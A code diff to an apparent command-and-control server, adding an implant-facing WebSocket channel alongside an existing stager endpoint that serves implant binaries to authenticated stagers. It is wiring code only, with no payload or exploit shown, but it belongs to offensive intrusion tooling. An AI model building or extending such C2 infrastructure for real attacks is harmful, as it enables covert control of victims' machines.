@@ -13,6 +13,7 @@ import { TaskQueue } from "./taskQueue.js";
 import { createRouter } from "./api.js";
 import { createStagerRouter } from "./stager.js";
 import { createWsBroadcaster } from "./ws.js";
+import { createImplantWsServer } from "./implant-ws.js";
 import type { C2ServerConfig } from "../types.js";
 
 const __dirname = dirname(fileURLToPath(import.meta.url));
@@ -73,6 +74,9 @@ export function startServer(cfg: Partial<C2ServerConfig> = {}): { close: () => v
 
   // WebSocket broadcast (attached to the same HTTP server)
   const broadcast = createWsBroadcaster(httpServer, config.apiKey);
+
+  // Implant-facing WebSocket (for WS transport fallback)
+  createImplantWsServer(httpServer, registry, taskQueue, config.implantToken, broadcast);
 
   // Stager endpoint (serves implant binary to authenticated stagers)
   const implantPath = process.env.C2_IMPLANT_PATH || join(__dirname, "..", "..", "..", "implant", "implant");
